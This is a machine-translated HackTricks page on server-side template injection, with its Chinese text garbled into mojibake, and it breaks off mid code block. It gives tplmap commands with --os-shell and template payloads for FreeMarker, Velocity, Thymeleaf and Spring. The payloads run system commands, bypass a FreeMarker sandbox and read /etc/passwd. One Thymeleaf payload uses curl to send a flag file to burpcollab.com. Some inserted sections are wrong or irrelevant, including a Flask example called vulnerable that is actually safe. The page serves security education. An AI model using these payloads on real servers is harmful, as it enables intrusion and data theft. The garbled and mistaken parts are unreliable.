# SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹èšé›†åœ°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ä»€ä¹ˆæ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ

å½“æ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨æœ¬åœ°æ¨¡æ¿è¯­æ³•å°†æ¶æ„æœ‰æ•ˆè´Ÿè½½æ³¨å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œæ—¶ï¼Œå°±ä¼šå‘ç”ŸæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚

**æ¨¡æ¿å¼•æ“**æ—¨åœ¨é€šè¿‡å°†**å›ºå®šæ¨¡æ¿**ä¸**æ˜“å˜æ•°æ®**ç»“åˆèµ·æ¥ç”Ÿæˆ**ç½‘é¡µ**ã€‚å½“ç”¨æˆ·è¾“å…¥ç›´æ¥**è¿æ¥åˆ°æ¨¡æ¿**è€Œä¸æ˜¯ä½œä¸ºæ•°æ®ä¼ é€’æ—¶ï¼Œå°±å¯èƒ½å‘ç”ŸæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿ**æ³¨å…¥ä»»æ„æ¨¡æ¿æŒ‡ä»¤**ä»¥æ“çºµæ¨¡æ¿å¼•æ“ï¼Œé€šå¸¸ä½¿ä»–ä»¬èƒ½å¤Ÿ**å®Œå…¨æ§åˆ¶æœåŠ¡å™¨**ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ä»£ç ç¤ºä¾‹ï¼š
```php
$output = $twig->render("Dear " . $_GET['name']);
```
åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œ**æ¨¡æ¿çš„ä¸€éƒ¨åˆ†**æ˜¯ä½¿ç”¨`GET`å‚æ•°`name`è¿›è¡Œ**åŠ¨æ€ç”Ÿæˆ**çš„ã€‚ç”±äºæ¨¡æ¿è¯­æ³•åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œè¯„ä¼°ï¼Œè¿™å¯èƒ½å…è®¸æ”»å‡»è€…å°†æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æœ‰æ•ˆè´Ÿè½½æ”¾ç½®åœ¨`name`å‚æ•°ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
## æ„å»ºæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»

![](../../.gitbook/assets/ssti-methodology-diagram.png)

### æ£€æµ‹

ä¸ä»»ä½•æ¼æ´ä¸€æ ·ï¼Œåˆ©ç”¨æ¼æ´çš„ç¬¬ä¸€æ­¥æ˜¯èƒ½å¤Ÿæ‰¾åˆ°å®ƒã€‚ä¹Ÿè®¸æœ€ç®€å•çš„åˆå§‹æ–¹æ³•æ˜¯é€šè¿‡æ³¨å…¥ä¸€ç³»åˆ—åœ¨æ¨¡æ¿è¡¨è¾¾å¼ä¸­å¸¸ç”¨çš„ç‰¹æ®Šå­—ç¬¦æ¥å°è¯•**æ¨¡ç³Šæµ‹è¯•æ¨¡æ¿**ï¼Œä¾‹å¦‚å¤šè¯­è¨€æ”¯æŒçš„`${{<%[%'"}}%\`ã€‚\
ä¸ºäº†æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œæ‚¨åº”è¯¥**è§‚å¯Ÿ**å‚æ•°ä¸Šçš„**å¸¸è§„æ•°æ®**å’Œ**ç»™å®šçš„æœ‰æ•ˆè´Ÿè½½**ä¹‹é—´çš„**å·®å¼‚**ã€‚\
å¦‚æœ**æŠ›å‡ºé”™è¯¯**ï¼Œå¾ˆå®¹æ˜“ç¡®å®š**æœåŠ¡å™¨å­˜åœ¨æ¼æ´**ï¼Œç”šè‡³å¯ä»¥ç¡®å®šæ­£åœ¨è¿è¡Œçš„**å¼•æ“**ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨**æœŸæœ›**æœåŠ¡å™¨**åæ˜ **ç»™å®šçš„æœ‰æ•ˆè´Ÿè½½ï¼Œä½†å®é™…ä¸Š**æ²¡æœ‰åæ˜ **æˆ–è€…å“åº”ä¸­æœ‰ä¸€äº›**ç¼ºå¤±çš„å­—ç¬¦**ï¼Œä¹Ÿå¯èƒ½å‘ç°å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ã€‚

**æ£€æµ‹ - æ˜æ–‡ä¸Šä¸‹æ–‡**

ç»™å®šçš„è¾“å…¥è¢«**æ¸²æŸ“å’Œåæ˜ **åˆ°å“åº”ä¸­ã€‚è¿™å¾ˆå®¹æ˜“è¢«è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªç®€å•çš„[**XSS**](../xss-cross-site-scripting/)æ¼æ´ï¼Œä½†å¦‚æœæ‚¨å°è¯•åœ¨æ¨¡æ¿è¡¨è¾¾å¼ä¸­è®¾ç½®**æ•°å­¦è¿ç®—**ï¼Œå°±å¾ˆå®¹æ˜“åŒºåˆ†å‡ºæ¥ï¼š
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
**æ£€æµ‹ - ä»£ç ä¸Šä¸‹æ–‡**

åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œ**ç”¨æˆ·è¾“å…¥**è¢«æ”¾ç½®åœ¨**æ¨¡æ¿è¡¨è¾¾å¼**ä¸­ï¼š
```python
engine.render("Hello {{"+greeting+"}}", data)
```
è®¿é—®è¯¥é¡µé¢çš„URLå¯èƒ½ç±»ä¼¼äºï¼š`http://vulnerable-website.com/?greeting=data.username`

å¦‚æœä½ **æ”¹å˜**äº†**`greeting`**å‚æ•°çš„å€¼ï¼Œ**å“åº”ä¸­å°†ä¸åŒ…å«ç”¨æˆ·å**ï¼Œä½†æ˜¯å¦‚æœä½ è®¿é—®ç±»ä¼¼äºï¼š`http://vulnerable-website.com/?greeting=data.username}}hello`ï¼Œ**å“åº”å°†åŒ…å«ç”¨æˆ·å**ï¼ˆå¦‚æœé—­åˆæ¨¡æ¿è¡¨è¾¾å¼å­—ç¬¦ä¸º**`}}`**ï¼‰ã€‚\
å¦‚æœåœ¨è¿™äº›æµ‹è¯•è¿‡ç¨‹ä¸­å‡ºç°**é”™è¯¯**ï¼Œå°†æ›´å®¹æ˜“å‘ç°æœåŠ¡å™¨å­˜åœ¨æ¼æ´ã€‚

### è¯†åˆ«

ä¸€æ—¦ä½ å‘ç°äº†æ¨¡æ¿æ³¨å…¥çš„æ½œåŠ›ï¼Œä¸‹ä¸€æ­¥æ˜¯è¯†åˆ«æ¨¡æ¿å¼•æ“ã€‚\
å°½ç®¡æœ‰å¤§é‡çš„æ¨¡æ¿è¯­è¨€ï¼Œä½†å…¶ä¸­è®¸å¤šä½¿ç”¨éå¸¸ç›¸ä¼¼çš„è¯­æ³•ï¼Œè¿™äº›è¯­æ³•è¢«ç‰¹æ„é€‰æ‹©ä¸ºä¸ä¸HTMLå­—ç¬¦å†²çªã€‚

å¦‚æœä½ å¾ˆå¹¸è¿ï¼ŒæœåŠ¡å™¨å°†**æ‰“å°é”™è¯¯**ï¼Œä½ å°†èƒ½å¤Ÿåœ¨**é”™è¯¯ä¿¡æ¯ä¸­æ‰¾åˆ°**ä½¿ç”¨çš„**å¼•æ“**ã€‚ä¸€äº›å¯èƒ½å¯¼è‡´é”™è¯¯çš„æœ‰æ•ˆè½½è·å¦‚ä¸‹ï¼š

| `${}`       | `{{}}`       | `<%= %>`        |
| ----------- | ------------ | --------------- |
| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
| `${7*7}`    | `{{7*7}}`    | \`\`            |

å¦åˆ™ï¼Œä½ éœ€è¦æ‰‹åŠ¨**æµ‹è¯•ä¸åŒçš„è¯­è¨€ç‰¹å®šæœ‰æ•ˆè½½è·**ï¼Œå¹¶ç ”ç©¶å®ƒä»¬å¦‚ä½•è¢«æ¨¡æ¿å¼•æ“è§£é‡Šã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨ä¸åŒæ¨¡æ¿å¼•æ“çš„è¯­æ³•æ³¨å…¥ä»»æ„æ•°å­¦è¿ç®—ï¼Œç„¶åè§‚å¯Ÿå®ƒä»¬æ˜¯å¦æˆåŠŸè®¡ç®—ã€‚ä¸ºäº†å¸®åŠ©è¿™ä¸ªè¿‡ç¨‹ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä¸‹é¢çš„å†³ç­–æ ‘ï¼š

![](<../../.gitbook/assets/image (272).png>)

### åˆ©ç”¨

**è¯»å–**

åœ¨å‘ç°æ¨¡æ¿æ³¨å…¥å¹¶è¯†åˆ«æ¨¡æ¿å¼•æ“åï¼Œç¬¬ä¸€æ­¥æ˜¯é˜…è¯»æ–‡æ¡£ã€‚æ„Ÿå…´è¶£çš„å…³é”®é¢†åŸŸåŒ…æ‹¬ï¼š

* æ¶µç›–åŸºæœ¬è¯­æ³•çš„â€œä¸ºæ¨¡æ¿ä½œè€…â€éƒ¨åˆ†ã€‚
* â€œå®‰å…¨æ³¨æ„äº‹é¡¹â€ - å¾ˆæœ‰å¯èƒ½ä½ æ­£åœ¨æµ‹è¯•çš„åº”ç”¨ç¨‹åºçš„å¼€å‘è€…æ²¡æœ‰é˜…è¯»è¿™ä¸ªéƒ¨åˆ†ï¼Œå®ƒå¯èƒ½åŒ…å«ä¸€äº›æœ‰ç”¨çš„æç¤ºã€‚
* å†…ç½®æ–¹æ³•ã€å‡½æ•°ã€è¿‡æ»¤å™¨å’Œå˜é‡çš„åˆ—è¡¨ã€‚
* æ‰©å±•/æ’ä»¶çš„åˆ—è¡¨ - æœ‰äº›å¯èƒ½é»˜è®¤å¯ç”¨ã€‚

**æ¢ç´¢**

å‡è®¾æ²¡æœ‰å‘ç°ä»»ä½•æ¼æ´ï¼Œä¸‹ä¸€æ­¥æ˜¯**æ¢ç´¢ç¯å¢ƒ**ï¼Œæ‰¾å‡º**ä½ å¯ä»¥è®¿é—®çš„å†…å®¹**ã€‚ä½ å¯ä»¥æœŸæœ›æ‰¾åˆ°æ¨¡æ¿å¼•æ“æä¾›çš„**é»˜è®¤å¯¹è±¡**å’Œå¼€å‘è€…é€šè¿‡æ¨¡æ¿ä¼ é€’ç»™æ¨¡æ¿çš„**åº”ç”¨ç¨‹åºç‰¹å®šå¯¹è±¡**ã€‚è®¸å¤šæ¨¡æ¿ç³»ç»Ÿå…¬å¼€äº†ä¸€ä¸ªåŒ…å«ä½œç”¨åŸŸä¸­æ‰€æœ‰å†…å®¹çš„â€œselfâ€æˆ–å‘½åç©ºé—´å¯¹è±¡ï¼Œä»¥åŠåˆ—å‡ºå¯¹è±¡å±æ€§å’Œæ–¹æ³•çš„æƒ¯ç”¨æ–¹å¼ã€‚

å¦‚æœæ²¡æœ‰å†…ç½®çš„selfå¯¹è±¡ï¼Œä½ å°†ä¸å¾—ä¸ä½¿ç”¨[SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)å’ŒBurp Intruderçš„å•è¯åˆ—è¡¨é›†åˆæ¥æš´åŠ›ç ´è§£å˜é‡åã€‚

å¼€å‘è€…æä¾›çš„å¯¹è±¡ç‰¹åˆ«å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¹¶ä¸”å¯èƒ½å› åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒæ¨¡æ¿è€Œå¼‚ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹æœ€å¥½é€ä¸ªç‹¬ç«‹åº”ç”¨äºæ¯ä¸ªä¸åŒçš„æ¨¡æ¿ã€‚

**æ”»å‡»**

æ­¤æ—¶ï¼Œä½ åº”è¯¥å¯¹å¯æ”»å‡»çš„æ”»å‡»é¢æœ‰ä¸€ä¸ª**æ˜ç¡®çš„äº†è§£**ï¼Œå¹¶èƒ½å¤Ÿç»§ç»­ä½¿ç”¨ä¼ ç»Ÿçš„å®‰å…¨å®¡è®¡æŠ€æœ¯ï¼Œå®¡æŸ¥æ¯ä¸ªå‡½æ•°æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚é‡è¦çš„æ˜¯è¦å°†è¿™ä¸ªè¿‡ç¨‹æ”¾åœ¨æ›´å¹¿æ³›çš„åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ä¸­è¿›è¡Œ - ä¸€äº›å‡½æ•°å¯ä»¥ç”¨äºåˆ©ç”¨åº”ç”¨ç¨‹åºç‰¹å®šåŠŸèƒ½ã€‚æ¥ä¸‹æ¥çš„ç¤ºä¾‹å°†ä½¿ç”¨æ¨¡æ¿æ³¨å…¥æ¥è§¦å‘ä»»æ„å¯¹è±¡åˆ›å»ºã€ä»»æ„æ–‡ä»¶è¯»å–/å†™å…¥ã€è¿œç¨‹æ–‡ä»¶åŒ…å«ã€ä¿¡æ¯æ³„éœ²å’Œæƒé™æå‡æ¼æ´ã€‚

## å·¥å…·

### [Tplmap](https://github.com/epinna/tplmap)
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
## æ¼æ´åˆ©ç”¨

### é€šç”¨

åœ¨è¿™ä¸ª**å­—å…¸**ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸‹é¢æåˆ°çš„ä¸€äº›å¼•æ“ç¯å¢ƒä¸­å®šä¹‰çš„**å˜é‡**ï¼š

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)

### Java

**Java - åŸºæœ¬æ³¨å…¥**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```
**Java - è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡**

åœ¨Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨`System.getenv()`æ–¹æ³•æ¥æ£€ç´¢ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª`Map`å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†æ‰€æœ‰çš„ç¯å¢ƒå˜é‡åŠå…¶å¯¹åº”çš„å€¼ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ä»£ç ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨`System.getenv()`æ–¹æ³•æ¥æ£€ç´¢ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼š

```java
import java.util.Map;

public class RetrieveEnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> envVariables = System.getenv();
        
        for (Map.Entry<String, String> entry : envVariables.entrySet()) {
            System.out.println(entry.getKey() + " = " + entry.getValue());
        }
    }
}
```

è¿è¡Œä»¥ä¸Šä»£ç ï¼Œå°†ä¼šè¾“å‡ºç³»ç»Ÿçš„æ‰€æœ‰ç¯å¢ƒå˜é‡åŠå…¶å¯¹åº”çš„å€¼ã€‚
```java
${T(java.lang.System).getenv()}
```
**Java - è·å– /etc/passwd æ–‡ä»¶**

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼ŒSSTIï¼‰æ¼æ´å­˜åœ¨æ—¶ï¼Œå¯ä»¥åˆ©ç”¨Javaè¯­è¨€æ¥æ£€ç´¢æœåŠ¡å™¨ä¸Šçš„ /etc/passwd æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä¸€ç§å¯èƒ½çš„æ–¹æ³•ï¼š

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class RetrievePasswd {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

è¯·æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•ä»…é€‚ç”¨äºå­˜åœ¨SSTIæ¼æ´çš„æƒ…å†µï¼Œå¹¶ä¸”éœ€è¦å…·æœ‰æ‰§è¡Œå‘½ä»¤çš„æƒé™ã€‚åœ¨å®é™…æ¸—é€æµ‹è¯•ä¸­ï¼Œåº”è¯¥éµå¾ªæ³•å¾‹å’Œé“å¾·è§„èŒƒï¼Œå¹¶è·å¾—åˆæ³•çš„æˆæƒã€‚
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

æ‚¨å¯ä»¥åœ¨[https://try.freemarker.apache.org](https://try.freemarker.apache.org)ä¸Šå°è¯•æ‚¨çš„æœ‰æ•ˆè½½è·

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} æ— æ•ˆ`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - æ²™ç›’ç»•è¿‡**

âš ï¸ ä»…é€‚ç”¨äºFreemarkerç‰ˆæœ¬ä½äº2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**æ›´å¤šä¿¡æ¯**

* åœ¨[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)çš„FreeMarkeréƒ¨åˆ†
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**æ›´å¤šä¿¡æ¯**

* åœ¨Velocityéƒ¨åˆ†çš„[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleafï¼ˆJavaï¼‰

SSTIçš„å…¸å‹æµ‹è¯•è¡¨è¾¾å¼æ˜¯`${7*7}`ã€‚è¿™ä¸ªè¡¨è¾¾å¼åœ¨Thymeleafä¸­ä¹Ÿé€‚ç”¨ã€‚å¦‚æœä½ æƒ³å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æµ‹è¯•è¡¨è¾¾å¼ä¹‹ä¸€ï¼š

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

ç„¶è€Œï¼Œæ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œè¡¨è¾¾å¼åªåœ¨ç‰¹æ®Šçš„Thymeleafå±æ€§ä¸­èµ·ä½œç”¨ã€‚å¦‚æœéœ€è¦åœ¨æ¨¡æ¿çš„å…¶ä»–ä½ç½®ä½¿ç”¨è¡¨è¾¾å¼ï¼ŒThymeleafæ”¯æŒ_è¡¨è¾¾å¼å†…è”_ã€‚è¦ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œå¿…é¡»å°†è¡¨è¾¾å¼æ”¾åœ¨`[[...]]`æˆ–`[(...)]`ä¸­ï¼ˆæ ¹æ®æ˜¯å¦éœ€è¦è½¬ä¹‰ç‰¹æ®Šç¬¦å·é€‰æ‹©å…¶ä¸­ä¹‹ä¸€ï¼‰ã€‚å› æ­¤ï¼ŒThymeleafçš„ä¸€ä¸ªç®€å•çš„SSTIæ£€æµ‹è½½è·å°†æ˜¯`[[${7*7}]]`ã€‚

ç„¶è€Œï¼Œä¸Šè¿°æ£€æµ‹è½½è·èƒ½å¤Ÿèµ·ä½œç”¨çš„æœºä¼šéå¸¸ä½ã€‚SSTIæ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä»£ç ä¸­åŠ¨æ€ç”Ÿæˆæ¨¡æ¿çš„æƒ…å†µä¸‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒThymeleafä¸å…è®¸è¿™æ ·çš„åŠ¨æ€ç”Ÿæˆæ¨¡æ¿ï¼Œæ‰€æœ‰æ¨¡æ¿å¿…é¡»äº‹å…ˆåˆ›å»ºå¥½ã€‚å› æ­¤ï¼Œå¦‚æœå¼€å‘äººå‘˜æƒ³è¦ä»å­—ç¬¦ä¸²ä¸­åŠ¨æ€åˆ›å»ºæ¨¡æ¿ï¼Œä»–ä»¬éœ€è¦åˆ›å»ºè‡ªå·±çš„TemplateResolverã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œä½†éå¸¸ç½•è§ã€‚

å¦‚æœæˆ‘ä»¬æ·±å…¥ç ”ç©¶Thymeleafæ¨¡æ¿å¼•æ“çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªæœ‰è¶£çš„åŠŸèƒ½ï¼Œç§°ä¸º_**è¡¨è¾¾å¼é¢„å¤„ç†**_ã€‚æ”¾ç½®åœ¨åŒä¸‹åˆ’çº¿(`__...__`)ä¹‹é—´çš„è¡¨è¾¾å¼å°†è¢«é¢„å¤„ç†ï¼Œå¹¶ä¸”é¢„å¤„ç†çš„ç»“æœå°†ä½œä¸ºè¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†åœ¨å¸¸è§„å¤„ç†è¿‡ç¨‹ä¸­ä½¿ç”¨ã€‚è¿™æ˜¯Thymeleafæ–‡æ¡£ä¸­çš„ä¸€ä¸ªå®˜æ–¹ç¤ºä¾‹ï¼š
```java
#{selection.__${sel.code}__}
```
**æ˜“å—æ”»å‡»çš„ç¤ºä¾‹**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    template = '''
    <h1>Welcome, {{ name }}!</h1>
    '''
    return render_template_string(template, name=name)

if __name__ == '__main__':
    app.run()
```

This vulnerable example demonstrates a Server-Side Template Injection (SSTI) vulnerability in a Flask web application. The application takes a user-supplied parameter `name` from the query string and renders it directly in the template using the `render_template_string` function.

An attacker can exploit this vulnerability by injecting malicious template code into the `name` parameter. Since the template code is executed on the server-side, the attacker can execute arbitrary code and potentially gain unauthorized access to sensitive information or perform other malicious actions.

To exploit this vulnerability, an attacker can craft a payload that includes template code to execute arbitrary commands or access server-side resources. For example, the following payload can be used to execute the `ls` command and retrieve a directory listing:

```
http://example.com/?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/').listdir('.') }}
```

In this payload, the `name` parameter is set to `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/').listdir('.') }}`, which retrieves the `listdir` method from the `os` module and executes it with the current directory as the argument.

To mitigate SSTI vulnerabilities, it is important to properly validate and sanitize user-supplied input before using it in templates. Additionally, using a template engine that automatically escapes user input can help prevent template injection attacks.
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**æ›´å¤šä¿¡æ¯**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Frameworkï¼ˆJavaï¼‰
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**ç»•è¿‡è¿‡æ»¤å™¨**

å¦‚æœ`${...}`ä¸èµ·ä½œç”¨ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨`#{...}`ã€`*{...}`ã€`@{...}`æˆ–`~{...}`æ¥ä½¿ç”¨å¤šä¸ªå˜é‡è¡¨è¾¾å¼ã€‚

* è¯»å–`/etc/passwd`æ–‡ä»¶
```java
